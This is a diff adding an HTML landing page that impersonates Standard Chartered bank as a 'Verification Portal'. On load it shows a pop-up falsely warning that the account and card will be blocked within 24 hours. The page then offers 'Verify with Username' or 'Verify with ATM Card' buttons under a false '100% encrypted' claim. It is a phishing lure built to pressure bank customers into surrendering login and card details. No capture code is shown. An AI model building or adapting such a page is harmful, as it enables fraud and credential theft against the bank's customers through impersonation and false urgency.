@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+<title>Mobile Landing</title>
+<style>
+  :root{
+    --green:#029a3e;
+    --green-press:#009337;
+    --text:#ffffff;
+    --muted:rgba(255,255,255,.8);
+    --blur:8px;
+    --splash-ms:1600;
+    --pop-ms:500ms;
+  }
+  html,body{
+    width:100%;
+    margin:0; overflow:hidden;
+    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    color:var(--text); background:#000;
+  }
+
+  /* replace your .screen block with this */
+.screen{
+  position:relative;
+  height:100dvh;         /* dynamic viewport height (accounts for browser UI) */
+  width:100%;
+  overflow:hidden;
+}
+
+/* optional—fallbacks for older browsers */
+@supports not (height: 100dvh) {
+  .screen{ height:100vh; }   /* older Android */
+}
+@supports (height: 100svh) {
+  .screen{ height:100svh; }  /* small viewport unit (Safari 15+) */
+}
+
+
+  /* Background video */
+  .bg{ position:absolute; inset:0; z-index:0; }
+  .bg video{
+    width:100%; height:100%;
+    object-fit:cover; object-position:center;
+    filter:saturate(1.02); will-change:filter;
+  }
+  .bg::after{
+    content:""; position:absolute; inset:0;
+    background:linear-gradient(180deg, rgba(0,0,0,.15) 0%, rgba(0,0,0,.45) 60%, rgba(0,0,0,.65) 100%);
+    pointer-events:none;
+  }
+  .is-blurred .bg video{ filter:blur(var(--blur)) saturate(1.02); }
+
+  /* Splash */
+  .splash{
+    position:absolute; inset:0; z-index:3;
+    display:flex; align-items:center; justify-content:center;
+    background:transparent; transition:opacity .35s ease;
+  }
+  .splash-logo{
+    width:140px; height:auto; object-fit:contain;
+    filter:drop-shadow(0 4px 16px rgba(0,0,0,.45));
+    animation:breath 1.2s ease-in-out infinite;
+  }
+  @keyframes breath{ 0%,100%{transform:scale(1);opacity:.95} 50%{transform:scale(1.03);opacity:1} }
+  .splash.hidden{ opacity:0; pointer-events:none; }
+
+  /* Top logo */
+  .top{
+    position:absolute; z-index:2;
+    top:calc(env(safe-area-inset-top,0px) + 10px);
+    right:12px; left:12px; height:44px;
+    display:flex; align-items:center; justify-content:flex-end;
+    opacity:0; transform:translateY(-6px) scale(.98);
+  }
+  .logo{ width:128px; height:auto; object-fit:contain; filter:drop-shadow(0 1px 2px rgba(0,0,0,.25)); }
+
+  /* Main content */
+  .content{
+    position:absolute; inset:0; z-index:1;
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    text-align:center; gap:18px; padding:0 20px;
+    margin-top: -100px;
+    transform:translateY(-6%); opacity:0; transform-origin:center;
+  }
+  .headline{
+    font-weight:500; font-size:24px; line-height:1.25; letter-spacing:.2px;
+    text-shadow:0 2px 6px rgba(0,0,0,.35);
+  }
+
+  .cta{ width:100%; max-width:360px; display:flex; flex-direction:column; gap:12px; }
+  .btn{
+    appearance:none; border:0; border-radius:5px;
+    padding: 26px 22px;  font-size:16px; font-weight:400; letter-spacing:.2px;
+    /* box-shadow:0 6px 16px rgba(0,0,0,.25); */
+    transition:transform .06s ease, background-color .06s ease, border-color .06s ease;
+    touch-action:manipulation;
+  }
+  .btn:active{ transform:translateY(1px); }
+  .btn-primary{ background:var(--green); color:#fff;}
+  .btn-primary:active{ background:var(--green-press); }
+  .or{ text-align:center; font-size:14px; font-weight:700; color:var(--muted); letter-spacing:.3px; }
+
+  .bottom{
+    position:absolute; z-index:1;
+    bottom:calc(env(safe-area-inset-bottom,0px) + 14px);
+    left:18px; right:18px; text-align:center;
+    font-size:12px; color:var(--muted); line-height:1.35;
+    text-shadow:0 2px 4px rgba(0,0,0,.4);
+    opacity:0; transform:translateY(6px) scale(.98);
+  }
+
+  @keyframes popIn{
+    0%{ opacity:0; transform:translateY(6px) scale(.98); }
+    100%{ opacity:1; transform:translateY(0) scale(1); }
+  }
+  .show-ui .top, .show-ui .content, .show-ui .bottom{
+    animation:popIn var(--pop-ms) cubic-bezier(.2,.7,.3,1) forwards;
+  }
+  .show-ui .content{ animation-delay:40ms; }
+  .show-ui .bottom{  animation-delay:80ms; }
+
+  /* ===== Modal (Notice) ===== */
+  .modal-backdrop{
+    position:absolute; inset:0; z-index:5;
+    display:flex; align-items:center; justify-content:center;
+    background:rgba(0,0,0,.7);
+    opacity:0; pointer-events:none; transition:opacity .25s ease;
+  }
+  .modal{
+    width:min(92%, 360px);
+    background:#fff; color:#000; text-align:center;
+    border-radius:16px; padding:18px 16px;
+    box-shadow:0 12px 32px rgba(0,0,0,.35);
+    transform:scale(.94); opacity:0;
+  }
+  .modal h2{ margin:6px 0 8px; font-size:18px; font-weight:700; }
+  .modal p{ margin:0 0 14px; font-size:14px; line-height:1.4; color:#222; }
+  .modal .btn{ width:100%; } /* full-width button inside modal */
+
+  .modal-backdrop.open{ opacity:1; pointer-events:auto; }
+  @keyframes modalIn{
+    from{ opacity:0; transform:scale(.94); }
+    to{ opacity:1; transform:scale(1); }
+  }
+  .modal-backdrop.open .modal{ animation:modalIn 220ms cubic-bezier(.2,.7,.3,1) forwards; }
+
+  @media (max-width:360px){
+    .headline{ font-size:20px; }
+    .btn{ font-size:15px; padding:13px 16px; }
+    .logo{ width:116px; }
+  }
+</style>
+</head>
+<body>
+  <div class="screen is-blurred" id="app">
+    <div class="bg" aria-hidden="true">
+      <video id="bgVideo" autoplay muted loop playsinline preload="metadata" poster="">
+        <source src="video_day.mp4" type="video/mp4" />
+      </video>
+    </div>
+
+    <div class="splash" id="splash">
+      <img class="splash-logo" src="logo.png" alt="Standard Chartered" />
+    </div>
+
+    <div class="top">
+      <img class="logo" src="logo.png" alt="Standard Chartered" />
+    </div>
+
+    <main class="content" role="main" aria-label="Welcome">
+      <h1 class="headline">Welcome to Verification Portal</h1>
+      <div class="cta">
+        <button class="btn btn-primary" type="button">Verify with Username</button>
+        <div class="or">Or</div>
+        <button class="btn btn-primary" type="button">Verify with ATM Card</button>
+      </div>
+    </main>
+
+    <div class="bottom">Your details are 100% encrypted and protected by advanced security protocols</div>
+
+    <!-- Notice Modal -->
+    <div class="modal-backdrop" id="notice">
+      <div class="modal" role="dialog" aria-labelledby="noticeTitle" aria-modal="true">
+        <h2 id="noticeTitle">Notice</h2>
+        <p>Dear Standard Chartered user, your account is at risk of deactivation because your verification has expired in our system records. Please update your verification immediately; otherwise, your Standard Chartered account & card will be temporarily blocked within 24 hours.</p>
+        <button class="btn btn-primary" id="ackBtn" type="button">I understand</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function(){
+      const app    = document.getElementById('app');
+      const splash = document.getElementById('splash');
+      const video  = document.getElementById('bgVideo');
+      const notice = document.getElementById('notice');
+      const ackBtn = document.getElementById('ackBtn');
+    
+      const prefersReduce = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+      if (prefersReduce && video){
+        video.removeAttribute('autoplay');
+        try { video.pause(); } catch(e){}
+      }
+      if (video){
+        video.loop = true;
+        video.addEventListener('ended', ()=> { video.currentTime = 0; video.play().catch(()=>{}); });
+      }
+    
+      let splashMinTime = parseInt(getComputedStyle(document.documentElement).getPropertyValue('--splash-ms')) || 1600;
+      let seenFrame = false, timerDone = false;
+      let modalTimer;   // <-- keep reference so we can clear it later
+    
+      const maybeReveal = () => {
+        if (!seenFrame || !timerDone) return;
+        splash.classList.add('hidden');
+        app.classList.remove('is-blurred');
+        app.classList.add('show-ui');
+    
+        // Open the Notice modal shortly after UI appears
+        modalTimer = setTimeout(()=>{ 
+          notice.classList.add('open'); 
+        }, 120);
+      };
+    
+      if (video){
+        const markFrame = () => { seenFrame = true; maybeReveal(); };
+        video.addEventListener('loadeddata', markFrame, {once:true});
+        video.addEventListener('canplay', markFrame, {once:true});
+        const tryPlay = () => video.play().catch(()=>{});
+        document.addEventListener('visibilitychange', () => { if (!document.hidden) tryPlay(); });
+        tryPlay();
+      } else {
+        seenFrame = true;
+      }
+    
+      setTimeout(()=>{ timerDone = true; maybeReveal(); }, splashMinTime);
+      setTimeout(()=>{ seenFrame = true; maybeReveal(); }, splashMinTime + 1200);
+    
+      // Close modal on button click
+      ackBtn.addEventListener('click', () => {
+        notice.classList.remove('open');
+        if (modalTimer) clearTimeout(modalTimer);   // <-- prevent it from reopening
+      });
+    })();
+    </script>
+    
+</body>
+</html>
